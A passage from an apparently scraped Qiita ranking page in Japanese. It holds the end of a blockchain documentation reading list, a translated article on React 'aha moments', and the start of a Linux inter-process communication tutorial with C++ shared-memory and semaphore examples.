<p><a href="http://docs.ens.domains/en/latest/" class="autolink" rel="nofollow noopener" target="_blank">http://docs.ens.domains/en/latest/</a></p>

<p>Ethereumの名前解決の仕組みであるENSの仕組みと使い方のドキュメントです。</p>

<h3>
<span id="swarm" class="fragment"></span><a href="#swarm"><i class="fa fa-link"></i></a>Swarm</h3>

<p><a href="https://swarm-guide.readthedocs.io/en/latest/introduction.html" class="autolink" rel="nofollow noopener" target="_blank">https://swarm-guide.readthedocs.io/en/latest/introduction.html</a></p>

<p>Ethereumで使える分散ファイルシステム(IPFSと似てる)のドキュメントです。</p>

<h2>
<span id="counterparty" class="fragment"></span><a href="#counterparty"><i class="fa fa-link"></i></a>Counterparty</h2>

<h3>
<span id="counterparty-document" class="fragment"></span><a href="#counterparty-document"><i class="fa fa-link"></i></a>Counterparty Document</h3>

<p><a href="https://counterparty.io/docs/" class="autolink" rel="nofollow noopener" target="_blank">https://counterparty.io/docs/</a></p>

<p>公式が出しているドキュメント群です。カウンターパーティー自体の動作原理はそこまで複雑ではないのですが、細かい部分や、EVMに似たスマートコントラクトなど、興味深い内容がたくさん乗っています、</p>

<h2>
<span id="hyperledger" class="fragment"></span><a href="#hyperledger"><i class="fa fa-link"></i></a>Hyperledger</h2>

<h3>
<span id="hyperledger-fabric-docs" class="fragment"></span><a href="#hyperledger-fabric-docs"><i class="fa fa-link"></i></a>Hyperledger Fabric docs</h3>

<p><a href="https://hyperledger-fabric.readthedocs.io/en/release/" class="autolink" rel="nofollow noopener" target="_blank">https://hyperledger-fabric.readthedocs.io/en/release/</a></p>

<p>readthedocsに上がっている、Hyperledger Fabricのドキュメントです。<br>
Fabric自体の構成（ネットワーク、コンセンサスレイヤー）の説明も、ノードの構築も、コード例もほとんどが乗っています。</p>

<h2>
<span id="ripple" class="fragment"></span><a href="#ripple"><i class="fa fa-link"></i></a>Ripple</h2>

<h3>
<span id="ripple-developer-center" class="fragment"></span><a href="#ripple-developer-center"><i class="fa fa-link"></i></a>Ripple Developer Center</h3>

<p><a href="https://ripple.com/build/" class="autolink" rel="nofollow noopener" target="_blank">https://ripple.com/build/</a></p>

<p>RippleのAPIやレイヤー構造、仕組みが乗っている公式ドキュメントです。</p>

<h2>
<span id="勉強会など" class="fragment"></span><a href="#%E5%8B%89%E5%BC%B7%E4%BC%9A%E3%81%AA%E3%81%A9"><i class="fa fa-link"></i></a>勉強会など</h2>

<h3>
<span id="ビットコインとか勉強会暗号通貨輪読会" class="fragment"></span><a href="#%E3%83%93%E3%83%83%E3%83%88%E3%82%B3%E3%82%A4%E3%83%B3%E3%81%A8%E3%81%8B%E5%8B%89%E5%BC%B7%E4%BC%9A%E6%9A%97%E5%8F%B7%E9%80%9A%E8%B2%A8%E8%BC%AA%E8%AA%AD%E4%BC%9A"><i class="fa fa-link"></i></a>ビットコインとか勉強会/暗号通貨輪読会</h3>

<p><a href="https://cryptocurrency.connpass.com/" class="autolink" rel="nofollow noopener" target="_blank">https://cryptocurrency.connpass.com/</a></p>

<p>ときおり参加させてもらっている勉強会です。ビットコインとか勉強会は初心者向け、暗号通貨輪読会は中級以上むけぐらいの難易度でした。とくに輪読会は、まだ海外のRedditや掲示板などでしか有名になっていない技術・ツールをわかりやすく解説してくれているのでありがたいです。<br>
過去にはSegwit、P2SH、Hivemindなどの勉強会がありました。</p>

<h2>
<span id="メーリングリスト" class="fragment"></span><a href="#%E3%83%A1%E3%83%BC%E3%83%AA%E3%83%B3%E3%82%B0%E3%83%AA%E3%82%B9%E3%83%88"><i class="fa fa-link"></i></a>メーリングリスト</h2>

<p><a href="https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev" class="autolink" rel="nofollow noopener" target="_blank">https://lists.linuxfoundation.org/mailman/listinfo/bitcoin-dev</a></p>

<p>Linux Foundationでホストされている、Bitcoinの事実上の公式メーリングリストです。情報ソース根源なので、新しいプロトコルなどの提案などがリアルタイムにはいってきます。</p>

<h2>
<span id="暗号" class="fragment"></span><a href="#%E6%9A%97%E5%8F%B7"><i class="fa fa-link"></i></a>暗号</h2>

<p>暗号分野です。具体的なサイトなどは上げませんが、ブロックチェーンを理解する上で、最低限ElGamal暗号やRSA暗号、楕円曲線暗号などの基本理解をしておくと、ぐっと文献の読みやすさが高くなります。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">43位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>229</kbd>
		<a target="_blank" href="https://qiita.com/ossan-engineer/items/66feec268f9c4e582bb6">Reactアハ体験</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-09-27<br />15:12:56</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/18685.html">ossan-engineer</a>(6件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/18685/profile-images/1473682498">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> <b>[reactjs]</b> <b>[React]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>Reactはちょっとしたコツを掴むと一気に理解が進みます。<br>
Googleのデベロッパーであり数々のReactトレーニングを手がけてきた<a href="https://github.com/tylermcginnis" rel="nofollow noopener" target="_blank">Tyler McGinnis氏</a>による<a href="https://tylermcginnis.com/react-aha-moments/" rel="nofollow noopener" target="_blank">React "Aha" Moments</a>が非常に参考になるため、本人の許可を得て意訳しました。<br>
誤りやより良い表現などがあればご指摘頂けると助かります。</p>

<p>原文：<a href="https://tylermcginnis.com/react-aha-moments/" class="autolink" rel="nofollow noopener" target="_blank">https://tylermcginnis.com/react-aha-moments/</a></p>

<hr>

<p>私が技術的なコンテンツを教えたり書いたりする時の主な目標の1つは「アハ体験」を最大化することです。<a href="https://en.wikipedia.org/wiki/Eureka_effect" rel="nofollow noopener" target="_blank">アハ体験</a>は物事が突然理解できた瞬間のひらめきです。私たちは皆これを体験してきましたし、私の知る最高の教師たちは聴衆に応じて、それらの瞬間を最大化するための教えを最適化することができます。</p>

<p>ここ数年、私はほぼ全ての一般的なメディアでReactを教えてきました。その間、私はReact習得における「アハ体験」の引き金について書き留めてきました。2週間ほど前、私は偶然<a href="https://www.reddit.com/r/reactjs/comments/5gmywc/what_were_the_biggest_aha_moments_you_had_while/" rel="nofollow noopener" target="_blank">Redditのこのスレッド</a>を見かけ、そこには同じアイデアが詰まっていました。そこで私がこの記事で意図しているのは、これらの体験についての知見を共有しつつ、Redditのスレッドで紹介された知見についても私の考えを述べることです。あなたがReactについてまだよく分かっていないようでしたら、この記事がその助けになることを願っています。</p>

<blockquote>
<p>fn(d) = V。UIは状態の関数であり、コンポーネントにとってのpropsは、関数にとっての引数のようなものです。</p>
</blockquote>

<p>React最大の利点の1つは、いつどこでReactコンポーネントを作成するかについて、JavaScriptの関数と同じ感覚をそのまま適用できることです。しかしながら、関数がいくつかの引数を受け取って値を返すのに対し、Reactはいくつかの引数を受け取ってUIのオブジェクト表現を返します。この考えは fn(d) = V という式でまとめられます。関数はデータを引数として受け取ってビューを返します。これはUI開発を考える上で最適な方法です。というのも、UIが異なる関数の呼び出しのみで構成されるからです。この手法は既に皆さんがアプリケーション開発で慣れ親しんでいるので、UI構築の際には関数合成の全ての利点を享受できるようになります。</p>

<blockquote>
<p>Reactでは、アプリケーションのUIは関数合成によって構築され、JSXはそれらの関数を抽象化しています。</p>
</blockquote>

<p>React初心者はほぼ例外なく「React自体は良さそうだけど、JSXがキモいんだよね。関心の分離ができてないし」と言います。JSXはHTMLになろうとしているわけではなく、間違いなくテンプレート言語以上のものです。JSXを理解するために重要な2つのポイントがあります。1つ目は、<a href="https://tylermcginnis.com/react-elements-vs-react-components/" rel="nofollow noopener" target="_blank">JSXはReact.createElementの抽象化である</a>ということです。その関数はDOMのオブジェクト表現を返します。それは冗長なのですが、JSXを書くたびにトランスパイルされ、実際のDOM（もしくはiOSやAndroidなどのプラットフォームでのビュー）を表現するオブジェクトになります。さらにReactはそのオブジェクトを分析し、変更前後の差分を抽出して、変更のあったDOMのみを更新します。これにはいくつかのパフォーマンス上の問題がありますが、もっと重要な点はJSXが本当に「単なるJavaScript」であることです。2つめは、JSXが単なるJavaScriptであることで、JavaScriptの宣言性（そして馴染みやすさ）はもちろんのこと、合成、静的検証やデバッグなどのJavaScriptが提供する全ての利点を活かすことができます。</p>

<blockquote>
<p>コンポーネントは必ずしもDOMノードに対応していなくても良いです。</p>
</blockquote>

<p>Reactを学び始めると、「コンポーネントはReactの建築用ブロックである」と教わります。入力を受け取り、UIを返すということは、全てのコンポーネントが直接UIを返さなくてはならないということでしょうか？他のコンポーネントをレンダリングするコンポーネント（HOCパターン）が必要な場合はどうでしょうか？stateの一部を管理し、UIを返す代わりにstateを渡す関数呼び出しを返すコンポーネント（レンダーpropsパターン）は？ビジュアルUIではなくサウンドを管理するコンポーネントがあったらそれは何を返すのでしょうか？Reactの素晴らしい点は、コンポーネントから典型的な「ビュー」を返す必要はないということです。最終的に返されるのは、React要素、nullまたはfalseです。素敵でしょう？</p>

<p>他のコンポーネントだって返せます。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>render() {
  return &lt;MyOtherComponent /&gt;
}
</pre></div></div>

<p>関数呼び出しも。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>render() {
  return this.props.children(this.someImportantState)
}
</pre></div></div>

<p>何も返さなくてもOKです。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>render() {
  return null
}
</pre></div></div>

<p>Ryan Florence氏の<a href="https://www.youtube.com/watch?v=kp-NOggyz54" rel="nofollow noopener" target="_blank">React Rally talk</a>はこの原則をより深くカバーしているのでオススメです。</p>

<blockquote>
<p>2つのコンポーネントがstateを共有したい場合、stateを同期させるのではなくstateを持ち上げる必要があります。</p>
</blockquote>

<p>コンポーネントベースのアーキテクチャでは、stateの共有は自ずと困難になります。2つのコンポーネントが同じstateに依存する場合、そのstateはどこにあるべきでしょうか？これは最終的にReduxで決着した解決策のエコシステム全体を活性化するような人気のある質問でした。Reduxの解決策は「store」と呼ばれる別の場所にstateを集約することです。コンポーネントはstoreを必要な部分だけ購読でき、storeを更新するための「actions」をdispatchすることもできます。Reactの解決策は2つのコンポーネントの最も近い親を探し、そこで共有stateを管理して必要に応じて子コンポーネントに渡すことです。どちらのアプローチにも一長一短がありますが、その選択肢を認識することが重要です。</p>

<blockquote>
<p>Reactでは継承は不要であり、封じ込めと専門特化の両方を合成によって達成できます。</p>
</blockquote>

<p>Reactは正当な理由により、関数型プログラミングの原則を採用するのに寛大です。React v0.13がES6クラスのミックスインをサポートをしないことが明らかになった時、継承から脱却して合成に向かって前進しました。その理由は、ミックスイン（または継承）によって達成できることのほとんど全てが合成によっても達成でき、しかも副作用をより抑えることができるからです。もしあなたが継承を重んじる考え方からReactに入ってきたのであれば、この考え方は難しく、おそらくあまり自然ではないと感じられることでしょう。幸運なことに、いくつかの素晴らしいリソースがあります。<a href="https://www.youtube.com/watch?v=wfMtDGfHWpA" rel="nofollow noopener" target="_blank">この動画</a>はReact固有の内容ではないですが役立つでしょう。</p>

<blockquote>
<p>コンテナコンポーネントとプレゼンテーショナルコンポーネントの分離</p>
</blockquote>

<p>Reactコンポーネントの解剖学について考える時、state、潜在的なライフサイクルフック、そしてJSX経由のマークアップが通常含まれます。それら全てが1つのコンポーネントに含まれる代わりに、stateとライフサイクルフックをマークアップから分離したらどうでしょうか？これにより2つのコンポーネントが生まれます。最初の1つは、stateとライフサイクルメソッドを持ち、コンポーネントがどのように動作するのかについて担当します。2つ目は、propsとしてデータを受け取りコンポーネントの外観を担当します。このアプローチにより、プレゼンテーショナルコンポーネントは受け取ったデータに結合されなくなるため、再利用性が向上します。さらに、あなた（もしくはプロジェクトへの新規参入者）がアプリケーションの構造を理解しやすくなります。開発者はUIを意識することなくコンポーネントの実装を取り替えることができ、その逆に、デザイナーはプレゼンテーショナルコンポーネントがどのようにデータを受け取るかを心配することなくUIを微調整することもまた可能になります。</p>

<p>この話題についての詳細は、<a href="https://medium.com/@dan_abramov/smart-and-dumb-components-7ca2f9a7c7d0#.q9tui51xz" rel="nofollow noopener" target="_blank">プレセンテーショナルとコンテナコンポーネント</a>を参照してください。</p>

<blockquote>
<p>ほとんどのコンポーネントをピュアにすれば、ステートレスなものは保守がずっと簡単になります。</p>
</blockquote>

<p>これはプレゼンテーショナルコンポーネントをコンテナコンポーネントから分離するもう1つの利点です。stateは一貫性の欠如と切り離して考えることはできません。適切な境界線を引くことで、複雑さをカプセル化してアプリケーションの予測可能性を大幅に改善させることができます。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">44位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>223</kbd>
		<a target="_blank" href="https://qiita.com/MoriokaReimen/items/5c4256ef620499a88bb3">Linuxのプロセス間通信</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-07<br />20:21:25</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/77676.html">MoriokaReimen</a>(26件の記事)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/77676/profile-images/1473700905">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[C]</b> <b>[C++]</b> <b>[Linux]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="この記事について" class="fragment"></span><a href="#%E3%81%93%E3%81%AE%E8%A8%98%E4%BA%8B%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6"><i class="fa fa-link"></i></a>この記事について</h1>

<p>LinuxのIPC（プロセス間通信）を紹介します。</p>

<h1>
<span id="プロセス間通信とは" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E9%96%93%E9%80%9A%E4%BF%A1%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>プロセス間通信とは</h1>

<p>Inter Process Communication(IPC)はプログラムの実行単位であるプロセスの間で行われるデータ交換のことを指します。プロセスの依存関係は可能な限り疎結合になるようOSで管理されています。そのため、IPCはLinux OSの機能を経由して行う必要があります。<br>
OSがプロセスに提供するデータ交換の方法はひとつだけではありません。それぞれ特徴のある多彩な方法を提供しています。<br>
ここで紹介するのは以下の5つです。</p>

<ol>
<li>共有メモリー</li>
<li>セマフォ</li>
<li>マップドメモリー</li>
<li>パイプ</li>
<li>ソケット通信</li>
</ol>

<p>（他にありましたらコメントで教えていただければ幸いです。）</p>

<p>それでは、見ていきましょう。</p>

<h1>
<span id="共有メモリ" class="fragment"></span><a href="#%E5%85%B1%E6%9C%89%E3%83%A1%E3%83%A2%E3%83%AA"><i class="fa fa-link"></i></a>共有メモリ</h1>

<p>プロセス間で同じメモリを共有します。<br>
共有メモリの最大の利点はそのアクセススピードにあります。<br>
一度共有メモリを生成してしまえばカーネルの機能を利用せずにアクセスすることができるため、プロセス内にある普通のメモリと同じ速度でアクセスできます。<br>
このアクセス速度のメリットが必要になるような処理性能が求められるソフトウェアではこの方法がよく使われます。<br>
一方、２つのプロセスから同時に書き込みを行うと競合が発生します。<br>
共有メモリにはこの競合を防ぐ相互排他機構が組み込まれていません。<br>
自分で用意する必要があります。</p>

<p>共有メモリを使ったサンプルコードをいかに示します。<br>
process_aで共有メモリを確保して文字列"Hello World!"を共有メモリに書き込みます。<br>
共有メモリに書き込まれたデータはprocess_bで読み取れてコンソールにプリントされます。</p>

<div class="code-frame" data-lang="c++">
<div class="code-lang"><span class="bold">process_a.cpp</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;cstdio&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;cstdlib&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/shm.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/ipc.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span>
<span class="p">{</span>
    <span class="cm">/* セグメントIDの生成 */</span>
    <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">file_path</span><span class="p">(</span><span class="s">"./key_data.dat"</span><span class="p">);</span>
    <span class="k">const</span> <span class="kt">int</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">42</span><span class="p">;</span>
    <span class="k">const</span> <span class="k">auto</span> <span class="n">key</span> <span class="o">=</span> <span class="n">ftok</span><span class="p">(</span><span class="n">file_path</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="n">id</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Failed to acquire key"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* セグメントの割当 */</span>
    <span class="k">const</span> <span class="kt">int</span> <span class="n">shared_segment_size</span> <span class="o">=</span> <span class="mh">0x6400</span><span class="p">;</span>
    <span class="k">const</span> <span class="k">auto</span> <span class="n">segment_id</span> <span class="o">=</span> <span class="n">shmget</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">shared_segment_size</span><span class="p">,</span>
                                   <span class="n">IPC_CREAT</span> <span class="o">|</span> <span class="n">IPC_EXCL</span> <span class="o">|</span> <span class="n">S_IRUSR</span> <span class="o">|</span> <span class="n">S_IWUSR</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="o">==</span><span class="n">segment_id</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="n">segment_id</span> <span class="o">&lt;&lt;</span> <span class="s">" :Failed to acquire segment"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* キーとセグメントIDの表示 */</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"キー："</span> <span class="o">&lt;&lt;</span> <span class="n">key</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"セグメントID："</span> <span class="o">&lt;&lt;</span> <span class="n">segment_id</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>

    <span class="cm">/* 共有メモリにアタッチ */</span>
    <span class="kt">char</span><span class="o">*</span> <span class="k">const</span> <span class="n">shared_memory</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">shmat</span><span class="p">(</span><span class="n">segment_id</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
    <span class="n">printf</span> <span class="p">(</span><span class="s">"shared memory attached at address %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">shared_memory</span><span class="p">);</span>

    <span class="cm">/* 共有メモリへの書込み */</span>
    <span class="n">sprintf</span> <span class="p">(</span><span class="n">shared_memory</span><span class="p">,</span> <span class="s">"Hello, world."</span><span class="p">);</span>


    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Hit any key when ready to close shared memory"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cin</span><span class="p">.</span><span class="n">get</span><span class="p">();</span>

    <span class="cm">/* 共有メモリのデタッチ */</span>
    <span class="n">shmdt</span><span class="p">(</span><span class="n">shared_memory</span><span class="p">);</span>
    <span class="cm">/* 共有メモリの解放 */</span>
    <span class="n">shmctl</span> <span class="p">(</span><span class="n">segment_id</span><span class="p">,</span> <span class="n">IPC_RMID</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="c++">
<div class="code-lang"><span class="bold">process_b.cpp</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;cstdio&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;cstdlib&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/shm.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span>
<span class="p">{</span>
    <span class="cm">/* セグメントIDの生成 */</span>
    <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">file_path</span><span class="p">(</span><span class="s">"./key_data.dat"</span><span class="p">);</span>
    <span class="k">const</span> <span class="kt">int</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">42</span><span class="p">;</span>
    <span class="k">const</span> <span class="k">auto</span> <span class="n">key</span> <span class="o">=</span> <span class="n">ftok</span><span class="p">(</span><span class="n">file_path</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="n">id</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Failed to acquire key"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>


    <span class="cm">/* 共有メモリにアタッチ */</span>
    <span class="k">const</span> <span class="k">auto</span> <span class="n">segment_id</span> <span class="o">=</span> <span class="n">shmget</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="k">const</span> <span class="n">shared_memory</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">shmat</span><span class="p">(</span><span class="n">segment_id</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
    <span class="n">printf</span> <span class="p">(</span><span class="s">"shared memory attached at address %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">shared_memory</span><span class="p">);</span>

    <span class="cm">/* 共有メモリの読み込み */</span>
    <span class="n">printf</span> <span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">shared_memory</span><span class="p">);</span>

    <span class="cm">/* 共有メモリのデタッチ */</span>
    <span class="n">shmdt</span><span class="p">(</span><span class="n">shared_memory</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<h2>
<span id="プロセス間通信に関わるlinuxのコマンド" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E9%96%93%E9%80%9A%E4%BF%A1%E3%81%AB%E9%96%A2%E3%82%8F%E3%82%8Blinux%E3%81%AE%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89"><i class="fa fa-link"></i></a>プロセス間通信に関わるLinuxのコマンド</h2>

<p>プロセス間通信のプログラムを作成するときに必要なコマンドを紹介します。<br>
ひとつはipcsコマンド。<br>
プロセス間通信の状態を表示します。</p>

<div class="code-frame" data-lang="console"><div class="highlight"><pre><span></span><span class="gp">kei@Glou-Glou:~/src/ipc/shared_memory$</span> ipcs

<span class="go">------ メッセージキュー --------</span>
<span class="go">キー     msqid      所有者  権限     使用済みバイト数 メッセージ</span>

<span class="go">------ 共有メモリセグメント --------</span>
<span class="go">キー     shmid      所有者  権限     バイト  nattch     状態      </span>
<span class="go">0x00000000 884736     kei        600        16777216   2                       </span>
<span class="go">0x00000000 1409025    kei        600        268435456  2          対象       </span>
<span class="go">0x00000000 819202     kei        600        524288     2          対象</span>

<span class="go">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~省略~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    </span>

<span class="go">------ セマフォ配列 --------</span>
<span class="go">キー     semid      所有者  権限     nsems     </span>

</pre></div></div>

<p>次にipcrmコマンドを紹介します。<br>
確保された共有リソースを解放します。</p>

<div class="code-frame" data-lang="console"><div class="highlight"><pre><span></span><span class="gp">kei@Glou-Glou:~/src/ipc/shared_memory$</span> ipcrm shm &lt;shmid&gt;
</pre></div></div>

<h1>
<span id="セマフォ" class="fragment"></span><a href="#%E3%82%BB%E3%83%9E%E3%83%95%E3%82%A9"><i class="fa fa-link"></i></a>セマフォ</h1>

<p>セマフォは整数型のデータを親子関係の無いプロセス間で共有します。<br>
複数プロセスの同時アクセスを制御する機構を持っていますが、整数型のデータしか扱えないというのが難点です。<br>
主な用途としては共有メモリの相互排他に使われます。<br>
以下が、セマフォの用いたサンプルコードです。</p>

<div class="code-frame" data-lang="c++">
<div class="code-lang"><span class="bold">process_a.cpp</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;sys/ipc.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;sys/sem.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;cstdlib&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>

<span class="k">union</span> <span class="n">semun</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">semid_ds</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="o">*</span><span class="n">array</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">seminfo</span> <span class="o">*</span><span class="n">__buf</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">enum</span> <span class="n">SEMAPHORE_OPERATION</span>
<span class="p">{</span>
    <span class="n">UNLOCK</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
    <span class="n">WAIT</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">LOCK</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="cm">/* セマフォの確保 */</span>
    <span class="k">const</span> <span class="kt">key_t</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">112</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">sem_flags</span> <span class="o">=</span> <span class="mo">0666</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">sem_id</span> <span class="o">=</span> <span class="n">semget</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">sem_flags</span> <span class="o">|</span> <span class="n">IPC_CREAT</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="n">sem_id</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Failed to acquire semapore"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>

